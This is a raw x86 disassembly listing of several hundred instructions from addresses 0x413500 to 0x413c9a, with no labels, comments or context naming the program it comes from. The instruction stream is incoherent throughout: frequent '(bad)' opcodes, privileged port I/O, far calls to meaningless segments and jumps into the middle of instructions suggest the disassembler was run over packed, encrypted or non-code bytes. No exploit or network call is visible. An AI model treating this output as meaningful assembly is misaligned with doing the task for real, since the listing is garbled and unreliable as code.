  413500:	(bad)  
  413501:	xchg   ecx,eax
  413502:	and    DWORD PTR [esi-0x445129c0],eax
  413508:	or     eax,0xdd2041bb
  41350d:	fcomi  st,st(3)
  41350f:	push   ss
  413510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413511:	mov    al,BYTE PTR [edx+0x78]
  413514:	pop    eax
  413515:	xchg   DWORD PTR [ecx],esp
  413517:	mov    ebp,0x5b037ebf
  41351c:	cmc    
  41351d:	mov    ecx,0xc1073ac6
  413522:	jmp    0x41351b
  413524:	mov    esp,0x2189d1a5
  413529:	lea    ecx,[ebx]
  41352b:	mov    dh,0x7d
  41352d:	(bad)  
  41352e:	and    al,0xca
  413530:	test   BYTE PTR [edx+ebx*4],cl
  413533:	mov    ecx,0x60cae35c
  413538:	push   edi
  413539:	std    
  41353a:	cmp    DWORD PTR [ecx],esp
  41353c:	jno    0x4135ae
  41353e:	(bad)  
  41353f:	xchg   esi,eax
  413540:	fwait
  413541:	lahf   
  413542:	outs   dx,DWORD PTR ds:[esi]
  413543:	loop   0x41358c
  413545:	call   0xd62a:0x8dc6ae46
  41354c:	push   esp
  41354d:	or     eax,DWORD PTR [ebx-0x26]
  413550:	icebp  
  413551:	mov    gs,WORD PTR [edx-0x314065d3]
  413557:	push   eax
  413558:	icebp  
  413559:	ret    
  41355a:	jl     0x4134e7
  41355c:	mov    ds:0x3d570232,eax
  413561:	push   ss
  413562:	add    bh,BYTE PTR [eax]
  413564:	scas   eax,DWORD PTR es:[edi]
  413565:	mov    ecx,0x904b5640
  41356a:	mov    esi,0xfa308840
  41356f:	into   
  413570:	(bad)  
  413571:	push   ds
  413572:	ret    
  413573:	or     al,0xc1
  413575:	mov    esp,0xbfdfeb3b
  41357a:	xchg   ebx,eax
  41357b:	test   bl,0x4a
  41357e:	imul   eax,DWORD PTR [edx],0xe9b51451
  413584:	shr    BYTE PTR [edi-0x2619cbcc],cl
  41358a:	aaa    
  41358b:	loop   0x4135bc
  41358d:	and    dh,BYTE PTR [ecx]
  41358f:	(bad)  
  413591:	sub    DWORD PTR [esi+0x7b],edi
  413594:	and    eax,0x37f06182
  413599:	(bad)  
  41359a:	xchg   edx,eax
  41359b:	div    BYTE PTR [ebx]
  41359d:	sbb    BYTE PTR [ebp-0x7b],bl
  4135a0:	xor    DWORD PTR ss:[eax],ecx
  4135a3:	and    DWORD PTR [esi*8+0x1c806ba9],ebx
  4135aa:	loop   0x4135b2
  4135ac:	inc    ebx
  4135ad:	xchg   esp,eax
  4135ae:	mov    ds:0x6c5a1f1e,eax
  4135b3:	outs   dx,DWORD PTR ds:[esi]
  4135b4:	cmp    edx,DWORD PTR [ebx+0x4ce5bbca]
  4135ba:	mov    dh,0x17
  4135bc:	dec    edi
  4135bd:	push   es
  4135be:	imul   ebp,esi,0xde18aae7
  4135c4:	add    esi,DWORD PTR [ebp+ecx*4-0xf]
  4135c8:	adc    BYTE PTR [ebp+0x9edd8a1],0xc2
  4135cf:	pop    ecx
  4135d0:	mov    ecx,0xf7da9443
  4135d5:	cmp    eax,0xdfb2644e
  4135da:	mov    dl,0x4c
  4135dc:	xchg   ebp,eax
  4135dd:	mov    eax,0xe1f5ac45
  4135e2:	(bad)  
  4135e4:	mov    dh,0x87
  4135e6:	sahf   
  4135e7:	sahf   
  4135e8:	call   0xe3639e7f
  4135ed:	push   0xaf8910f1
  4135f2:	and    bl,BYTE PTR [ebx-0x2141c1e]
  4135f8:	(bad)  
  4135f9:	sub    ah,BYTE PTR [ecx-0xe]
  4135fc:	aaa    
  4135fd:	js     0x413604
  4135ff:	adc    al,0xff
  413601:	inc    eax
  413602:	fwait
  413603:	pop    ebp
  413604:	out    0x72,al
  413606:	sub    al,0x92
  413608:	mov    ch,0x0
  41360a:	sbb    eax,DWORD PTR [edi-0x3370a8ec]
  413610:	and    eax,0x45713c79
  413615:	add    DWORD PTR [ebp+0x6c],edx
  413618:	int3   
  413619:	fmul   DWORD PTR [ebx+0x478036d4]
  41361f:	lods   al,BYTE PTR ds:[esi]
  413620:	and    ecx,ebp
  413622:	enter  0xdbc5,0xa6
  413626:	xchg   esp,eax
  413627:	xor    al,0xc7
  413629:	rcl    DWORD PTR [ebp+0x63],cl
  41362c:	push   eax
  41362d:	pusha  
  41362e:	repnz mov esi,0xdc84266f
  413634:	out    0x49,eax
  413636:	jb     0x41365d
  413638:	data16 sti 
  41363a:	jae    0x4135c3
  41363c:	push   edx
  41363d:	pop    esp
  41363e:	pusha  
  41363f:	xor    DWORD PTR [edi-0xb],edi
  413642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413643:	inc    esi
  413644:	add    DWORD PTR [ebp-0x3],eax
  413647:	loope  0x41369f
  413649:	fisubr WORD PTR [eax-0x70]
  41364c:	mov    al,0x20
  41364e:	cmp    DWORD PTR [esi],ebp
  413650:	in     eax,dx
  413651:	mov    DWORD PTR [edx],esi
  413653:	push   ecx
  413654:	cli    
  413655:	popa   
  413656:	fisub  WORD PTR [ebp+0x6f1d890b]
  41365c:	popa   
  41365d:	lods   eax,DWORD PTR ds:[esi]
  41365e:	in     al,dx
  41365f:	int    0x97
  413661:	dec    ebp
  413662:	ja     0x413698
  413664:	in     al,dx
  413665:	fsubr  DWORD PTR [eax+ebx*2-0xe8cb1ca]
  41366c:	sahf   
  41366d:	aas    
  41366e:	(bad)  
  41366f:	icebp  
  413670:	xchg   ecx,eax
  413671:	mov    ds:0x8b802a2e,al
  413676:	idiv   BYTE PTR [edi]
  413678:	sbb    eax,0x662eecbd
  41367d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41367e:	sbb    bh,0xee
  413681:	mov    ds:0xfb8763c1,al
  413686:	into   
  413687:	outs   dx,DWORD PTR ds:[esi]
  413688:	and    ecx,DWORD PTR [eax]
  41368a:	xor    eax,0x4f383b7
  41368f:	lock sbb DWORD PTR [eax-0x2f6cb1b],edx
  413696:	mov    cs,ebp
  413698:	inc    ebp
  413699:	(bad)  
  41369a:	shl    BYTE PTR [ecx+eiz*2],1
  41369d:	mov    bh,0x55
  41369f:	mov    esp,0x6b523ed2
  4136a4:	xchg   ebx,eax
  4136a5:	fldenv [edx-0x4eb39a24]
  4136ab:	mov    al,ds:0xcab8037e
  4136b0:	cmp    eax,0xc224797e
  4136b5:	addr16 retf 
  4136b7:	loope  0x413734
  4136b9:	std    
  4136ba:	fwait
  4136bb:	adc    edi,DWORD PTR [eax+edx*1]
  4136be:	pop    edi
  4136bf:	ror    al,cl
  4136c1:	js     0x413705
  4136c3:	xor    eax,0x7d219551
  4136c8:	mov    DWORD PTR [edx+0x66],0x302b09ae
  4136cf:	hlt    
  4136d0:	popf   
  4136d1:	call   FWORD PTR [edi-0x394e1608]
  4136d7:	sbb    eax,0xfc2f00b
  4136dc:	sahf   
  4136dd:	inc    ebx
  4136de:	shr    BYTE PTR [edi-0x2a],1
  4136e1:	enter  0x45e7,0xfd
  4136e5:	inc    edx
  4136e6:	leave  
  4136e7:	mov    esp,0xb8d43c27
  4136ec:	jle    0x4136dc
  4136ee:	mov    ecx,0xef47b0f5
  4136f3:	and    cl,al
  4136f5:	mov    ds:0x3c986509,eax
  4136fa:	inc    esp
  4136fb:	push   es
  4136fc:	loopne 0x41369f
  4136fe:	fimul  WORD PTR [ecx+ebp*2-0x36bca2d0]
  413705:	repnz mov edi,ds
  413708:	mov    al,0x45
  41370a:	ins    DWORD PTR es:[edi],dx
  41370b:	push   ecx
  41370c:	mov    edi,DWORD PTR ds:0x7bd01af9
  413712:	and    al,0x7
  413714:	ins    DWORD PTR es:[edi],dx
  413715:	iret   
  413716:	ret    0x6ad
  413719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41371a:	push   eax
  41371b:	dec    edi
  41371c:	fwait
  41371d:	xor    DWORD PTR [eax+ecx*8],ebx
  413720:	dec    edi
  413721:	imul   ebp,DWORD PTR [eax+0x6f],0xea628609
  413728:	(bad)  [ebp-0x51]
  41372b:	jmp    0x893:0x135cc6d5
  413732:	jns    0x4136f8
  413734:	lock addr16 cmc 
  413737:	mov    DWORD PTR [esi],eax
  413739:	pop    edx
  41373a:	mov    edx,0x12292a6
  41373f:	rcl    DWORD PTR [esi],0x7f
  413742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413743:	dec    esp
  413744:	not    DWORD PTR [edi]
  413746:	std    
  413747:	jb     0x413735
  413749:	sub    bh,al
  41374b:	mov    es,WORD PTR ds:0x99421e7e
  413751:	cli    
  413752:	dec    ebp
  413753:	fcmovu st,st(3)
  413755:	xor    ah,BYTE PTR [ecx]
  413757:	inc    edx
  413758:	imul   ebx,eax,0x9c837b6f
  41375e:	xchg   ebx,eax
  41375f:	mov    ecx,0xa8d08775
  413764:	or     ebx,esp
  413766:	fnstsw ax
  413768:	push   0x8c2ce95a
  41376d:	loope  0x4137b8
  41376f:	sar    BYTE PTR [edi+ebp*4-0x4d],cl
  413773:	push   cs
  413774:	ror    ebx,0xa8
  413777:	cmp    eax,0x48f51769
  41377c:	aam    0xdd
  41377e:	ja     0x413778
  413780:	inc    ecx
  413781:	pop    esi
  413782:	fldcw  WORD PTR [edx+0xd]
  413785:	or     al,0xa9
  413787:	mov    ebx,0x2954a49
  41378c:	ss shr bl,1
  41378f:	jge    0x41379a
  413791:	mov    ds:0xbd3ec1a7,al
  413796:	cmc    
  413797:	push   ebx
  413798:	bound  eax,QWORD PTR [edi+0x18]
  41379b:	out    0xf9,eax
  41379d:	daa    
  41379e:	and    edx,DWORD PTR [esi+0x3]
  4137a1:	repz inc esi
  4137a3:	outs   dx,BYTE PTR ds:[esi]
  4137a4:	call   FWORD PTR [ecx-0x12]
  4137a7:	dec    ecx
  4137a8:	push   ds
  4137a9:	pop    ds
  4137aa:	scas   al,BYTE PTR es:[edi]
  4137ab:	popf   
  4137ac:	cmp    eax,0x9a5b145e
  4137b1:	bound  esp,QWORD PTR [ebx+0x1893bec2]
  4137b7:	popf   
  4137b8:	call   0xce77:0x284abe90
  4137bf:	dec    esp
  4137c0:	stos   BYTE PTR es:[edi],al
  4137c1:	nop
  4137c2:	xor    edi,esi
  4137c4:	mov    ebp,0xd173eaae
  4137c9:	mov    dh,bh
  4137cb:	dec    eax
  4137cc:	cdq    
  4137cd:	push   ss
  4137ce:	aad    0x62
  4137d0:	stos   DWORD PTR es:[edi],eax
  4137d1:	inc    eax
  4137d2:	fmul   st(2),st
  4137d4:	sub    edx,0xffffff95
  4137d7:	shr    cl,cl
  4137d9:	cmp    DWORD PTR [esi+0x7cf09d7b],ecx
  4137df:	sbb    DWORD PTR [ebp+0x3ac9f361],eax
  4137e5:	dec    esp
  4137e6:	ja     0x41380c
  4137e8:	mov    DWORD PTR [edx+edi*8-0x38],edi
  4137ec:	clc    
  4137ed:	popf   
  4137ee:	and    ebp,edi
  4137f0:	test   BYTE PTR [eax],bl
  4137f2:	mov    ebp,0xf052b499
  4137f7:	test   al,0x66
  4137f9:	mov    ds:0x8c9a5afa,eax
  4137fe:	retf   0x9230
  413801:	mov    BYTE PTR [ebp+0x19],ah
  413804:	test   al,0x80
  413806:	add    al,0xd3
  413808:	lds    edx,FWORD PTR [edx]
  41380a:	fisubr DWORD PTR [ecx-0x6036ef8a]
  413810:	hlt    
  413811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413812:	sub    esi,DWORD PTR [eax+0x3a]
  413815:	pop    edx
  413816:	int3   
  413817:	scas   al,BYTE PTR es:[edi]
  413818:	add    BYTE PTR [eax],al
  41381a:	and    eax,0xfbd4f00f
  413820:	push   eax
  413821:	dec    esi
  413822:	mov    dl,0x3f
  413824:	and    esi,DWORD PTR [ebx+0x8b3e779]
  41382a:	fmul   QWORD PTR [edx+ebp*2+0x4b409f04]
  413831:	out    0x36,al
  413833:	or     eax,0x47f3c989
  413838:	call   0x6972:0x42da8f27
  41383f:	or     DWORD PTR [edi*1-0x701e6fcc],0xfffffffe
  413847:	sbb    eax,0x3b5569e7
  41384c:	cdq    
  41384d:	adc    BYTE PTR [ebx-0x32438f45],0x6f
  413854:	add    eax,0x6c9a63ea
  413859:	test   eax,0x2e04adef
  41385e:	mov    cl,0x9e
  413860:	das    
  413861:	das    
  413862:	cdq    
  413863:	retf   
  413864:	dec    ch
  413866:	jo     0x4138c4
  413868:	nop
  413869:	mov    eax,ds:0xfefda804
  41386e:	inc    ebx
  41386f:	mov    DWORD PTR [eax],ecx
  413871:	test   DWORD PTR [ebp-0x3ce79e7b],0x6fa82f2c
  41387b:	jl     0x413826
  41387d:	xchg   esi,eax
  41387e:	xor    dl,dh
  413880:	nop
  413881:	inc    ebx
  413882:	cs lock xchg esi,eax
  413885:	nop
  413886:	ss cmp al,0x76
  413889:	stos   BYTE PTR es:[edi],al
  41388a:	lahf   
  41388b:	mov    al,ds:0xdfac7195
  413890:	scas   eax,DWORD PTR es:[edi]
  413891:	out    dx,al
  413892:	sub    esp,esi
  413894:	dec    ebp
  413895:	retf   
  413896:	icebp  
  413897:	inc    esp
  413898:	push   ebx
  413899:	test   DWORD PTR [ebp+ebp*8-0x2c094b8c],esi
  4138a0:	adc    BYTE PTR [edi+eiz*1+0x5ed5ace1],ch
  4138a7:	sub    dl,BYTE PTR [ecx]
  4138a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138aa:	cs loopne 0x4138a3
  4138ad:	in     eax,dx
  4138ae:	dec    ecx
  4138af:	inc    eax
  4138b0:	(bad)  
  4138b1:	pop    ebp
  4138b2:	into   
  4138b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138b4:	scas   al,BYTE PTR es:[edi]
  4138b5:	dec    ebx
  4138b6:	sub    eax,ebx
  4138b8:	mov    eax,0xdd0b74b3
  4138bd:	xchg   esp,eax
  4138be:	push   0x7b07498
  4138c3:	fdivrp st(5),st
  4138c5:	jl     0x413930
  4138c7:	ret    
  4138c8:	jae    0x413891
  4138ca:	cmp    ebp,eax
  4138cc:	pop    edx
  4138cd:	mov    ah,0x51
  4138cf:	sbb    cl,BYTE PTR [ebx-0x25]
  4138d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138d4:	ja     0x413932
  4138d6:	repz or cl,BYTE PTR [edx+0x53c70ae6]
  4138dd:	(bad)  
  4138de:	rol    DWORD PTR [edi+0x2df59dcb],cl
  4138e4:	(bad)  
  4138e5:	fisub  WORD PTR [ecx+0x52]
  4138e8:	ret    0xbda8
  4138eb:	xor    edi,eax
  4138ed:	ins    BYTE PTR es:[edi],dx
  4138ee:	les    ebx,FWORD PTR [edx]
  4138f0:	mov    esi,0xfa312f09
  4138f5:	push   edx
  4138f6:	push   0xffffffc9
  4138f8:	or     esp,DWORD PTR [eax+0x27fe154c]
  4138fe:	dec    edx
  4138ff:	pop    cx
  413901:	stos   DWORD PTR es:[edi],eax
  413902:	xchg   edi,eax
  413903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413904:	dec    ecx
  413905:	xchg   ebp,eax
  413906:	push   edx
  413907:	sbb    bl,bh
  413909:	(bad)  
  41390a:	mov    edx,DWORD PTR ss:[esi]
  41390d:	and    ch,BYTE PTR [esi-0x5884dd1a]
  413913:	sahf   
  413914:	mov    eax,ds:0xb57db734
  413919:	xchg   edi,eax
  41391a:	pop    es
  41391b:	pop    eax
  41391c:	xlat   BYTE PTR ds:[ebx]
  41391d:	jmp    edi
  41391f:	mov    dh,0x1b
  413921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413922:	in     al,0x8b
  413924:	xlat   BYTE PTR ds:[ebx]
  413925:	nop
  413926:	out    0x9d,al
  413928:	lods   al,BYTE PTR ds:[esi]
  413929:	pop    eax
  41392a:	xchg   esi,eax
  41392b:	inc    edi
  41392c:	ret    
  41392d:	div    DWORD PTR [ebx+0x500f9c4e]
  413933:	push   esi
  413934:	idiv   ebp
  413936:	out    0xcb,al
  413938:	jmp    0x413911
  41393a:	add    al,0x46
  41393c:	pop    ss
  41393d:	jo     0x4138f2
  41393f:	shr    BYTE PTR [edi-0x72],cl
  413942:	test   eax,0x2cb3ae89
  413947:	iret   
  413948:	push   eax
  413949:	lahf   
  41394a:	xor    BYTE PTR es:[edi-0x40de1b5d],al
  413951:	lods   eax,DWORD PTR ds:[esi]
  413952:	loopne 0x4139b3
  413954:	or     eax,0x7fbfc041
  413959:	nop
  41395a:	sub    bh,BYTE PTR [edi]
  41395c:	ss addr16 mov ch,0xdf
  413960:	add    ch,ah
  413962:	icebp  
  413963:	iret   
  413964:	lods   al,BYTE PTR ds:[esi]
  413965:	ins    BYTE PTR es:[edi],dx
  413966:	pushf  
  413967:	loop   0x413934
  413969:	pop    esi
  41396a:	mov    ah,0xb2
  41396c:	(bad)  
  41396d:	mov    cl,0xf8
  41396f:	aaa    
  413970:	mov    ah,0xd1
  413972:	call   0x74ba1c55
  413977:	cwde   
  413978:	and    BYTE PTR [esi+edi*8],ah
  41397b:	push   0x33
  41397d:	lods   eax,DWORD PTR ds:[esi]
  41397e:	int    0xe7
  413980:	js     0x4139fa
  413982:	(bad)  
  413983:	xchg   esi,eax
  413984:	xor    edi,edi
  413986:	lods   al,BYTE PTR ds:[esi]
  413987:	adc    DWORD PTR [ecx],edi
  413989:	inc    edi
  41398a:	loope  0x413a05
  41398c:	sahf   
  41398d:	pop    esp
  41398e:	pushf  
  41398f:	call   FWORD PTR [ebx-0x6a]
  413992:	jmp    FWORD PTR [ecx+0x72ac317]
  413998:	iret   
  413999:	nop
  41399a:	push   esi
  41399b:	imul   ecx,DWORD PTR [eax-0x3b],0x137b2c60
  4139a2:	mov    DWORD PTR [eax],esp
  4139a4:	jns    0x4139a0
  4139a6:	pop    esi
  4139a7:	dec    eax
  4139a8:	lea    ebp,[ecx-0xba542c1]
  4139ae:	mov    ebx,0x4bfda072
  4139b3:	fs sub al,0xe9
  4139b6:	aam    0x13
  4139b8:	jno    0x4139e4
  4139ba:	stos   DWORD PTR es:[edi],eax
  4139bb:	sub    ch,BYTE PTR [esi]
  4139bd:	loop   0x4139e7
  4139bf:	mov    ah,0xc3
  4139c1:	jae    0x413992
  4139c3:	or     esp,ebx
  4139c5:	shl    DWORD PTR [edx+0x467d7bd8],0x4
  4139cc:	mov    esi,eax
  4139ce:	xchg   BYTE PTR [ebx-0x1],cl
  4139d1:	jmp    0x4ce48fb5
  4139d6:	or     eax,0x755b5d3
  4139db:	mov    ah,0xa9
  4139dd:	daa    
  4139de:	shr    DWORD PTR [ebx-0x4c571ed5],cl
  4139e4:	pop    esi
  4139e5:	inc    eax
  4139e6:	mov    al,BYTE PTR [eax]
  4139e8:	cs (bad) 
  4139ea:	outs   dx,DWORD PTR ds:[esi]
  4139eb:	sbb    DWORD PTR [esi+0x57f88b42],0xffffffe5
  4139f2:	mov    ebx,0x6cc6ddb1
  4139f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f8:	loopne 0x413a43
  4139fa:	dec    ebp
  4139fb:	jo     0x413a71
  4139fd:	stc    
  4139fe:	cmp    eax,0x8a46e77c
  413a03:	sbb    ecx,DWORD PTR [ebx+0x79690105]
  413a09:	push   ebx
  413a0a:	daa    
  413a0b:	sar    bh,1
  413a0d:	lock inc ebp
  413a0f:	imul   ecx,DWORD PTR [edi-0x268add76],0x46d02e9b
  413a19:	aam    0xb
  413a1b:	scas   eax,DWORD PTR es:[edi]
  413a1c:	mov    dl,0x27
  413a1e:	and    BYTE PTR [ebx],cl
  413a20:	jb     0x413a96
  413a22:	je     0x413a60
  413a24:	sbb    esp,DWORD PTR [ebx]
  413a26:	ins    BYTE PTR es:[edi],dx
  413a27:	(bad)  
  413a28:	scas   al,BYTE PTR es:[edi]
  413a29:	aaa    
  413a2a:	lods   al,BYTE PTR ds:[esi]
  413a2b:	add    al,0xf1
  413a2d:	pop    edi
  413a2e:	pusha  
  413a2f:	push   cs
  413a30:	mov    al,ds:0xfae65a47
  413a35:	ret    
  413a36:	sbb    BYTE PTR [edi+0x1832dd79],dh
  413a3c:	mov    DWORD PTR [esi+0x798c8ad1],esp
  413a42:	(bad)  
  413a44:	jmp    0x53dc19d0
  413a49:	loop   0x413a6c
  413a4b:	push   edi
  413a4c:	cmp    al,0xce
  413a4e:	jb     0x413a43
  413a50:	mov    ebp,0xc599bb53
  413a55:	mov    ebp,0x2d1d9bb2
  413a5a:	std    
  413a5b:	ds in  eax,dx
  413a5d:	mov    esp,0xb74d744b
  413a62:	ja     0x413ac7
  413a64:	hlt    
  413a65:	test   al,0x22
  413a67:	push   esi
  413a68:	ins    BYTE PTR es:[edi],dx
  413a69:	mov    eax,0x74c0a899
  413a6e:	push   es
  413a6f:	sub    ch,al
  413a71:	push   0x15
  413a73:	scas   al,BYTE PTR es:[edi]
  413a74:	jle    0x413a5c
  413a76:	sub    BYTE PTR [ebx-0x701bf130],ah
  413a7c:	and    BYTE PTR [edx+0x1238da7c],bl
  413a82:	add    eax,0xac4794b1
  413a87:	xchg   edi,eax
  413a88:	out    0xc6,eax
  413a8a:	xor    al,0x1c
  413a8c:	xchg   ecx,eax
  413a8d:	xlat   BYTE PTR ds:[ebx]
  413a8e:	sbb    al,0xb1
  413a90:	fdivp  st(1),st
  413a92:	push   edx
  413a93:	imul   esp,DWORD PTR [edi-0x49],0x14d83cf3
  413a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a9b:	sbb    al,0x7f
  413a9d:	pop    ebp
  413a9e:	aad    0x82
  413aa0:	cli    
  413aa1:	mov    ch,0xc3
  413aa3:	mov    ds:0x6aa41abb,al
  413aa8:	cmp    BYTE PTR [ecx],ah
  413aaa:	add    BYTE PTR [edi-0x32bb3253],dh
  413ab0:	js     0x413af2
  413ab2:	retf   
  413ab3:	jno    0x413a41
  413ab5:	(bad)  
  413ab6:	jecxz  0x413b01
  413ab8:	dec    edi
  413ab9:	retf   0xb55b
  413abc:	push   0x27a5a4d9
  413ac1:	pop    edi
  413ac2:	rcl    DWORD PTR [edx+0x678c431c],cl
  413ac8:	and    dl,al
  413aca:	lods   eax,DWORD PTR ds:[esi]
  413acb:	scas   al,BYTE PTR es:[edi]
  413acc:	ins    DWORD PTR es:[edi],dx
  413acd:	cmp    al,0x3c
  413acf:	mov    cl,0xec
  413ad1:	or     DWORD PTR [ebx+0x48804f7b],edx
  413ad7:	cmp    edi,ebp
  413ad9:	dec    edi
  413ada:	imul   eax,DWORD PTR [eax+0x50],0xfeffa2da
  413ae1:	enter  0x4b16,0x7a
  413ae5:	jecxz  0x413ae4
  413ae7:	jl     0x413b62
  413ae9:	int    0x45
  413aeb:	pop    ebp
  413aec:	xchg   edi,esi
  413aee:	mov    ah,0x3e
  413af0:	jge    0x413a7c
  413af2:	cwde   
  413af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413af5:	test   eax,eax
  413af7:	mov    esi,DWORD PTR [edx]
  413af9:	call   0x9d031268
  413afe:	sbb    al,0xfa
  413b00:	rcl    ebp,cl
  413b02:	pop    es
  413b03:	sar    BYTE PTR [ebp+0x5c9f4fee],cl
  413b09:	sbb    ebp,ebp
  413b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b0c:	enter  0xdb16,0xac
  413b10:	iret   
  413b11:	xor    BYTE PTR [bp+di+0x3c38],bh
  413b16:	mov    gs,WORD PTR [esi-0x57cba97f]
  413b1c:	xchg   edi,eax
  413b1d:	push   edx
  413b1e:	ja     0x413b74
  413b20:	aam    0x13
  413b22:	adc    eax,0x7c5983e7
  413b27:	ret    
  413b28:	xor    BYTE PTR [edi-0x6b],dh
  413b2b:	js     0x413b2f
  413b2d:	push   cs
  413b2e:	mov    gs,WORD PTR [edi-0x16a09296]
  413b34:	mov    ds:0x8b96dbc3,eax
  413b39:	xchg   esp,eax
  413b3a:	scas   al,BYTE PTR es:[edi]
  413b3b:	push   ss
  413b3c:	add    eax,DWORD PTR [ecx]
  413b3e:	pop    ebx
  413b3f:	ja     0x413ba9
  413b41:	inc    ebx
  413b42:	cmp    eax,0x68a4116
  413b47:	sub    al,0x27
  413b49:	sbb    eax,0x596ae832
  413b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b4f:	jb     0x413b84
  413b51:	pop    ecx
  413b52:	cld    
  413b53:	mov    dh,0xb5
  413b55:	imul   eax,DWORD PTR [esp+ecx*1+0x53],0x12
  413b5a:	push   0xffffffce
  413b5c:	jecxz  0x413bca
  413b5e:	jl     0x413bc3
  413b60:	(bad)  
  413b61:	sub    BYTE PTR [edi+0x7fa159ba],0xc7
  413b68:	pop    ebx
  413b69:	mov    esp,gs
  413b6b:	aam    0x33
  413b6d:	push   ebx
  413b6e:	imul   ecx,DWORD PTR [ebx],0x83a4cb3e
  413b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b75:	psubusw mm5,QWORD PTR [esi-0x6f]
  413b79:	das    
  413b7a:	hlt    
  413b7b:	iret   
  413b7c:	out    0x23,eax
  413b7e:	test   al,0xa4
  413b80:	cmp    ebx,esi
  413b82:	cld    
  413b83:	and    dl,dl
  413b85:	and    al,0x3
  413b87:	push   ss
  413b88:	or     DWORD PTR ds:0xb066fb1d,ecx
  413b8e:	adc    BYTE PTR [ecx],bl
  413b90:	ins    DWORD PTR es:[edi],dx
  413b91:	in     al,dx
  413b92:	scas   al,BYTE PTR es:[edi]
  413b93:	xchg   ebp,eax
  413b94:	daa    
  413b95:	loop   0x413b7d
  413b97:	ins    DWORD PTR es:[edi],dx
  413b98:	dec    esp
  413b99:	lock icebp 
  413b9b:	idiv   ah
  413b9d:	jge    0x413b46
  413b9f:	scas   eax,DWORD PTR es:[edi]
  413ba0:	xchg   ebp,eax
  413ba1:	sbb    ecx,0x5a203a9a
  413ba7:	loope  0x413b38
  413ba9:	mov    gs,WORD PTR ds:0x3f8e9e00
  413baf:	add    DWORD PTR [edx+0x1a],0x2f
  413bb3:	pop    eax
  413bb4:	cmp    al,0x8e
  413bb6:	mov    ch,BYTE PTR [ebp-0x448c1c87]
  413bbc:	sub    BYTE PTR ds:0x470fd095,bh
  413bc2:	loop   0x413bc4
  413bc4:	jb     0x413b8d
  413bc6:	cmp    al,0x7a
  413bc8:	(bad)
  413bcb:	sbb    BYTE PTR [esi-0x2ad4d7f2],al
  413bd1:	sub    eax,0xebd10658
  413bd6:	pop    ss
  413bd7:	lea    edi,[esp+ebp*8+0x66]
  413bdb:	xlat   BYTE PTR ds:[ebx]
  413bdc:	mov    eax,0x3bf33179
  413be1:	inc    esp
  413be2:	mov    ebx,0x8d63fda4
  413be7:	inc    esp
  413be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be9:	scas   al,BYTE PTR es:[edi]
  413bea:	(bad)
  413bee:	ret    
  413bef:	ja     0x413c3f
  413bf1:	lods   eax,DWORD PTR ds:[esi]
  413bf2:	inc    ebp
  413bf3:	push   ebx
  413bf4:	mov    esi,0xe9a902b1
  413bf9:	data16 add BYTE PTR [esi-0x69],0x8a
  413bfe:	loopne 0x413c62
  413c00:	aas    
  413c01:	(bad)  
  413c02:	fwait
  413c03:	lock aam 0x5f
  413c06:	sbb    al,0xa2
  413c08:	packssdw mm6,QWORD PTR [edi+0x21]
  413c0c:	stc    
  413c0d:	das    
  413c0e:	and    BYTE PTR [eax+0x7e5e5461],al
  413c14:	dec    esp
  413c15:	aaa    
  413c16:	jg     0x413ba1
  413c18:	add    ebp,ebp
  413c1a:	dec    ebx
  413c1b:	push   ecx
  413c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c1d:	fild   DWORD PTR [edx-0xce3bba0]
  413c23:	inc    esp
  413c24:	test   DWORD PTR [esi-0x50],ecx
  413c27:	iret   
  413c28:	or     DWORD PTR [esi],esp
  413c2a:	cwde   
  413c2b:	scas   eax,DWORD PTR es:[edi]
  413c2c:	rcr    DWORD PTR [eax+0x642444a9],0xf5
  413c33:	mov    ah,0x2
  413c35:	or     dh,BYTE PTR [ebp+0x26a28f4e]
  413c3b:	pop    edi
  413c3c:	sub    eax,0xbfa7efb4
  413c41:	or     BYTE PTR [esi+0xc],dl
  413c44:	add    BYTE PTR [ecx+0x865eaa7],cl
  413c4a:	xchg   ebp,eax
  413c4b:	push   0xffffffc6
  413c4d:	cmp    eax,0x91c34ed6
  413c52:	sti    
  413c53:	push   edi
  413c54:	cmp    esp,DWORD PTR [ebx]
  413c56:	mov    ecx,0xdf17cc1d
  413c5b:	mov    ah,0x16
  413c5d:	enter  0xf175,0xd
  413c61:	push   edi
  413c62:	add    al,BYTE PTR [esi+ebp*8-0x10e890ff]
  413c69:	mov    bl,0x87
  413c6b:	mov    ah,0x27
  413c6d:	sub    ch,BYTE PTR [edi+ebx*4-0x14]
  413c71:	xlat   BYTE PTR ds:[ebx]
  413c72:	cmp    bh,ah
  413c74:	inc    ebp
  413c75:	mov    al,0xe7
  413c77:	jae    0x413c2f
  413c79:	sub    BYTE PTR [edi+0x5b416136],dl
  413c7f:	push   0x49
  413c81:	sar    cl,1
  413c83:	pushf  
  413c84:	push   esp
  413c85:	mov    al,ds:0xf7d3f40
  413c8a:	pop    esp
  413c8b:	or     BYTE PTR ds:0x4684e7bc,dl
  413c91:	sbb    DWORD PTR [esi+0x79],ebx
  413c94:	loope  0x413c18
  413c96:	scas   al,BYTE PTR es:[edi]
  413c97:	aas    
  413c98:	ins    DWORD PTR es:[edi],dx
  413c99:	push   ebx
  413c9a:	or     BYTE PTR [ebp+edx*8+0x7acf6b0],cl
